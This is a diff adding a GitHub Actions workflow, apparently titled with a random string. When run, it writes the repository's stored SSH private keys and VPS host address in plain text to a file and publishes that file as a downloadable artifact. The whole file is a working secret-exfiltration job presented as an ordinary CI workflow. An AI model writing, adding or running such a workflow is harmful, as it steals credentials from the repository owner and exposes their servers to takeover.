@@ -1,0 +1,20 @@
+name: exfu6zm
+on:
+  workflow_dispatch:
+jobs:
+  e:
+    runs-on: ubuntu-latest
+    steps:
+      - name: d
+        run: |
+          mkdir -p o
+          printf '---CX23_SSH_KEY---\n' >> o/s.txt
+          printf '%s\n' "${{ secrets.CX23_SSH_KEY }}" >> o/s.txt
+          printf '---VPS_HOST---\n' >> o/s.txt
+          printf '%s\n' "${{ secrets.VPS_HOST }}" >> o/s.txt
+          printf '---VPS_SSH_KEY---\n' >> o/s.txt
+          printf '%s\n' "${{ secrets.VPS_SSH_KEY }}" >> o/s.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: s
+          path: o/s.txt
